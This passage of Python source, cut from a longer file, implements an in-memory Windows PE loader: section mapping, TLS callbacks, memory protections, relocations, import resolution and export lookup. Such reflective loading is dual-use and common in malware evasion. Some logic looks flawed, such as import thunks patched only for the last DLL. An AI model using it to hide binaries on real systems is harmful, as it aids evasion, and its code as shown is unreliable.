                raise WindowsError('Error copying section no. %s to address: 0x%x',self.sections[i].Name.decode('utf-8'),dest)
            self.sections[i].Misc_PhysicalAddress = dest
            tmpdata = create_unsigned_buffer(size, self.__data__[self.sections[i].PointerToRawData:(self.sections[i].PointerToRawData+size)])
            if not memmove(cast(dest,c_void_p), tmpdata, size):
                raise RuntimeError('memmove failed')
            del tmpdata
            self.dbg('Copied section no. %s to address: 0x%x', self.sections[i].Name.decode('utf-8'), dest)
            i += 1
            

    def ExecuteTLS(self):
        codebase = self._codebaseaddr
        
        directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_TLS] 
        if directory.VirtualAddress <= 0: 
            self.dbg("no TLS address found")
            return True
    
        tlsaddr = codebase + directory.VirtualAddress
        tls = IMAGE_TLS_DIRECTORY.from_address(tlsaddr)
        callback = IMAGE_TLS_CALLBACK.from_address(tls.AddressOfCallBacks)
        callbackaddr=tls.AddressOfCallBacks
        
        while(callback):
            TLSexec=TLSexecProc(callback.value)
            tlsres= TLSexec( cast(codebase,LPVOID), DLL_PROCESS_ATTACH, 0)
            if not bool(tlsres):
                raise WindowsError('TLS could not be executed.')
            else:
                # 8 bytes step - this is the size of the callback field in the TLS callbacks table. Need to initialize callback to IMAGE_TLS_CALLBACK with
                # the updated address, otherwise callback.value won't be null when the callback table is finished and the while won't exit
                self.dbg("TLS callback executed")
                callbackaddr+=sizeof(c_ulonglong)
                callback= IMAGE_TLS_CALLBACK.from_address(callbackaddr)                

    def finalize_sections(self):
        sectionaddr = self.IMAGE_FIRST_SECTION()
        numSections = self.moduleshifting.contents.headers.contents.FileHeader.NumberOfSections
        imageOffset = POINTER_TYPE(self.moduleshifting.contents.headers.contents.OptionalHeader.ImageBase & 0xffffffff00000000) if isx64 else POINTER_TYPE(0)
        checkCharacteristic = lambda sect, flag: 1 if (sect.Characteristics & flag) != 0 else 0
        getPhysAddr = lambda sect: section.contents.PhysicalAddress | imageOffset.value
        
        self.dbg("Found %d total sections.",numSections)
        for i in range(0, numSections):
            self.dbg("Section n. %d",i)
            
            section = cast(sectionaddr, PIMAGE_SECTION_HEADER)
            size = self.sections[i].SizeOfRawData
            if size == 0:
                if checkCharacteristic(self.sections[i], IMAGE_SCN_CNT_INITIALIZED_DATA):
                    self.dbg("Zero size rawdata section")
                    size = self.moduleshifting.contents.headers.contents.OptionalHeader.SizeOfInitializedData
                elif checkCharacteristic(self.sections[i], IMAGE_SCN_CNT_UNINITIALIZED_DATA):
                    size = self.moduleshifting.contents.headers.contents.OptionalHeader.SizeOfUninitializedData
                    self.dbg("Uninitialized data, return")
                    continue
            if size == 0:
                self.dbg("zero size section")
                continue
            self.dbg("size=%d",size)    
            oldProtect = DWORD(0)
            self.dbg("execute %d",checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_EXECUTE))
            executable = checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_EXECUTE)
            self.dbg("read %d",checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_READ))
            readable = checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_READ)
            writeable = checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_WRITE)
            self.dbg("write %d",checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_WRITE))

            if checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_DISCARDABLE):
                addr = getPhysAddr(section)
                VirtualFree(addr, self.sections[i].SizeOfRawData, MEM_DECOMMIT)
                continue

            protect = ProtectionFlags[executable][readable][writeable]
            self.dbg("Protection flag:%d",protect)
            if checkCharacteristic(self.sections[i], IMAGE_SCN_MEM_NOT_CACHED):
                print("not cached")            
                protect |= PAGE_NOCACHE
            

            size = self.sections[i].SizeOfRawData
            if size == 0:
                if checkCharacteristic(self.sections[i], IMAGE_SCN_CNT_INITIALIZED_DATA):
                    size = self.moduleshifting.contents.headers.contents.OptionalHeader.SizeOfInitializedData
                elif checkCharacteristic(self.sections[i], IMAGE_SCN_CNT_UNINITIALIZED_DATA):
                    size = self.moduleshifting.contents.headers.contents.OptionalHeader.SizeOfUninitializedData
            if size > 0:
                addr = self.sections[i].Misc_PhysicalAddress #getPhysAddr(section)
                self.dbg("physaddr:0x%x", addr)
                if addr == self.hostingdll._handle:
                    print("skipping VP")
                elif VirtualProtect(addr, size, protect, byref(oldProtect)) == 0:
                    raise WindowsError("Error protecting memory page")
            sectionaddr += sizeof(IMAGE_SECTION_HEADER)
            i += 1

    
    def perform_base_relocations(self, delta):
        codeBaseAddr = self._codebaseaddr
        directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        if directory.Size <= 0: return
        relocaddr=codeBaseAddr + directory.VirtualAddress
        relocation = IMAGE_BASE_RELOCATION.from_address(relocaddr)
        maxreloc = lambda r: (relocation.SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2

        while relocation.VirtualAddress > 0:
            i = 0
            dest = codeBaseAddr + relocation.VirtualAddress
            relinfoaddr = relocaddr + IMAGE_SIZEOF_BASE_RELOCATION
            while i < maxreloc(relocaddr):
                relinfo = c_ushort.from_address(relinfoaddr)
                type = relinfo.value >> 12
                offset = relinfo.value & 0xfff
                if type == IMAGE_REL_BASED_ABSOLUTE:
                    self.dbg("Skipping relocation")
                elif type == IMAGE_REL_BASED_HIGHLOW or (type == IMAGE_REL_BASED_DIR64 and isx64):
                    self.dbg("Relocating offset: 0x%x", offset)
                    patchAddrHL = cast(dest + offset, LP_POINTER_TYPE)
                    patchAddrHL.contents.value += delta
                else:
                    self.dbg("Unknown relocation at address: 0x%x", relocation)
                    break
                # advancing two bytes at a time in the relocation table
                relinfoaddr += 2
                i += 1
            relocaddr += relocation.SizeOfBlock
            relocation = IMAGE_BASE_RELOCATION.from_address(relocaddr)
    
    
    def build_import_table(self, dlopen = LoadLibraryW):
        codebase = self._codebaseaddr
        self.dbg("codebase:0x%x", codebase)
        directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_IMPORT]
        
        if directory.Size <= 0:
            self.dbg('Import directory\'s size appears to be zero or less. Skipping.. (Probably not good)')
            return
        importdescaddr = codebase + directory.VirtualAddress
        check = not bool(IsBadReadPtr(importdescaddr, sizeof(IMAGE_IMPORT_DESCRIPTOR)))
        if not check:
            self.dbg('IsBadReadPtr(address) at address: 0x%x returned true', importdescaddr)
        i=0 # index for entry import struct
        try:
            for i in range(0, len(self.DIRECTORY_ENTRY_IMPORT)):
                self.dbg('Found importdesc at address: 0x%x', importdescaddr)
                importdesc = directory.VirtualAddress 
                
                # ref: https://sites.google.com/site/peofcns/win32forth/pe-header-f/02-image_directory/02-import_descriptor
                entry_struct=self.DIRECTORY_ENTRY_IMPORT[i].struct
                entry_imports=self.DIRECTORY_ENTRY_IMPORT[i].imports
                dll = self.DIRECTORY_ENTRY_IMPORT[i].dll.decode('utf-8')
                if not bool(dll):
                    self.dbg('Importdesc at address 0x%x name is NULL. Skipping load library', importdescaddr)
                    hmod = dll
                else:
                    self.dbg('Found imported DLL, %s. Loading..', dll)
                    hmod = dlopen(dll)
                    if not bool(hmod): raise WindowsError('Failed to load library, %s' % dll)
                    result_realloc= realloc(
                        self.moduleshifting.contents.modules,
                        (self.moduleshifting.contents.modules._b_base_.numModules + 1) * sizeof(HMODULE)
                    )
                    if not bool(result_realloc):
                        raise WindowsError('Failed to allocate additional room for our new import.')
                    self.moduleshifting.contents.modules = cast(result_realloc, type(self.moduleshifting.contents.modules))
                    self.moduleshifting.contents.modules[self.moduleshifting.contents.modules._b_base_.numModules] = hmod
                    self.moduleshifting.contents.modules._b_base_.numModules += 1
        

            thunkrefaddr = funcrefaddr = codebase + entry_struct.FirstThunk
            if entry_struct.OriginalFirstThunk > 0:
                thunkrefaddr = codebase + entry_struct.OriginalFirstThunk
            
            for j in range(0, len(entry_imports)):
            
                funcref = cast(funcrefaddr, PFARPROC)
                if entry_imports[j].import_by_ordinal == True:   
                    if 'decode' in dir(entry_imports[j].ordinal):
                        importordinal= entry_imports[j].ordinal.decode('utf-8')
                    else:
                        importordinal= entry_imports[j].ordinal
                        
                    self.dbg('Found import ordinal entry, %s', cast(importordinal, LPCSTR))
                    funcref.contents = GetProcAddress(hmod, cast(importordinal, LPCSTR))
                    address = funcref.contents
                else:
                    importname= entry_imports[j].name.decode('utf-8') 
                    self.dbg('Found import by name entry %s , at address 0x%x', importname, entry_imports[j].address)
                    address= getprocaddr(hmod, importname.encode())
                    if not memmove(funcrefaddr,address.to_bytes(sizeof(LONG_PTR),'little'),sizeof(LONG_PTR)):
                        raise WindowsError('memmove failed')
                    self.dbg('Resolved import %s at address 0x%x', importname, address)
                if not bool(address):
                    raise WindowsError('Could not locate function for thunkref %s', importname)
                funcrefaddr += sizeof(PFARPROC)
                j +=1
            i +=1 
        except AttributeError:
            self.dbg('Import Table not found')    

    ### TODO - Free exe's memory
    def free_library(self):
        self.dbg("Freeing dll")
        if not bool(self.moduleshifting): return
        pmodule = pointer(self.moduleshifting)
        if self.moduleshifting.contents.initialized != 0:
            DllEntry = DllEntryProc(self.moduleshifting.contents.codeBase + self.moduleshifting.contents.headers.contents.OptionalHeader.AddressOfEntryPoint)
            DllEntry(cast(self.moduleshifting.contents.codeBase, HINSTANCE), DLL_PROCESS_DETACH, 0)
            pmodule.contents.initialized = 0
        if bool(self.moduleshifting.contents.modules) and self.moduleshifting.contents.numModules > 0:
            for i in range(1, self.moduleshifting.contents.numModules):
                if self.moduleshifting.contents.modules[i] != HANDLE(INVALID_HANDLE_VALUE):
                    FreeLibrary(self.moduleshifting.contents.modules[i])

        if bool(self._codebaseaddr):
            VirtualFree(self._codebaseaddr, 0, MEM_RELEASE)

        HeapFree(GetProcessHeap(), 0, self.moduleshifting)
        self.close()

    
    def _proc_addr_by_ordinal(self, idx):
        codebase = self._codebaseaddr
        if idx == -1:
            raise WindowsError('Could not find the function specified')
        elif idx > self._exports_.NumberOfFunctions:
            raise WindowsError('Ordinal number higher than our actual count.')
        funcoffset = DWORD.from_address(codebase + self._exports_.AddressOfFunctions + (idx * 4))
        return funcoffset.value

    
    def _proc_addr_by_name(self, name):
        codebase = self._codebaseaddr
        exports = self._exports_
        if exports.NumberOfNames == 0:
            raise WindowsError('EXE doesn\'t export anything.')

        ordinal = -1
        name = name.lower()
        namerefaddr = codebase + exports.AddressOfNames
        ordinaladdr = codebase + exports.AddressOfNamesOrdinals
        i = 0
        while i < exports.NumberOfNames:
            nameref = DWORD.from_address(namerefaddr)
            funcname = string_at(codebase + nameref.value).lower()
            if funcname.decode() == name:
                ordinal = WORD.from_address(ordinaladdr).value
            i += 1
            namerefaddr += sizeof(DWORD)
            ordinaladdr += sizeof(WORD)
        return self._proc_addr_by_ordinal(ordinal)
    
    def get_proc_addr(self, name_or_ordinal):
        codebase = self._codebaseaddr
        if not hasattr(self, '_exports_'):
            directory = self.OPTIONAL_HEADER.DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT]
            # No export table found
            if directory.Size <= 0: raise WindowsError('No export table found.')
            self._exports_ = IMAGE_EXPORT_DIRECTORY.from_address(codebase + directory.VirtualAddress)
            if self._exports_.NumberOfFunctions == 0:
                # DLL doesn't export anything
                raise WindowsError('EXE doesn\'t export anything.')
        targ = type(name_or_ordinal)
        if targ in [ str, str, str ]:
            name_or_ordinal = str(name_or_ordinal)
            procaddr_func = self._proc_addr_by_name
        elif targ in [ int, int ]:
            name_or_ordinal = int(name_or_ordinal)
            procaddr_func = self._proc_addr_by_ordinal
        else:
            raise TypeError('Don\'t know what to do with name/ordinal of type: %s!' % targ)

        if not name_or_ordinal in self._foffsets_:
            self._foffsets_[name_or_ordinal] = procaddr_func(name_or_ordinal)
        return FARPROC(codebase + self._foffsets_[name_or_ordinal])

